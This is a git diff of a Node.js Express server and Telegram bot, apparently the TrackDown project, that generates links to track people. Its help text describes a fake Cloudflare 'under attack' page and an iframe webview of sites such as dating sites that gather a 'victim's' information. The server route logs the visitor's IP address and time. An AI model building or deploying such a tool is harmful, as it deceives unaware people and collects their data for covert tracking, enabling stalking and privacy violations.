@@ -1,44 +1,37 @@
 const fs = require("fs");
 const express = require("express");
-var cors = const fs = require("fs");
-const express = require("express");
-const cors = require('cors');
-const bodyParser = require('body-parser');
+var cors = require('cors');
+var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env["bot"], {polling: true});
-
-// Install node-telegram-bot-api package
+var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
+var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
 const app = express();
-const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
-const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-// TOGGLE for Shorters
-let use1pt = false;
+//Modify your URL here
+var hostURL="https://demo.coolify.io/";
+//TOGGLE for Shorters
+var use1pt=false;
 
 
-app.get("/w/:path/:uri", (req, res) => {
-  let ip;
-  let d = new Date();
-  d = d.toJSON().slice(0, 19).replace('T', ':');
-  if (req.headers['x-forwarded-for']) {
-    ip = req.headers['x-forwarded-for'].split(",")[0];
-  } else if (req.connection && req.connection.remoteAddress) {
-    ip = req.connection.remoteAddress;
-  } else {
-    ip = req.ip;
-  }
 
-  if (req.params.path != null) {
-    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
-  } else {
-    res.redirect("https://t.me/th30neand0nly0ne");
-  }
-});
+app.get("/w/:path/:uri",(req,res)=>{
+var ip;
+var d = new Date();
+d=d.toJSON().slice(0,19).replace('T',':');
+if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+  
+if(req.params.path != null){
+res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
+} 
+else{
+res.redirect("https://t.me/th30neand0nly0ne");
+}
 
          
                               
@@ -91,7 +84,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/MrJokar111/HackDevicesData
+\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
 `);
 }
   
@@ -246,3 +239,11 @@ res.send("Done");
 app.listen(5000, () => {
 console.log("App Running on Port 5000!");
 });
+
+
+
+
+
+
+
+
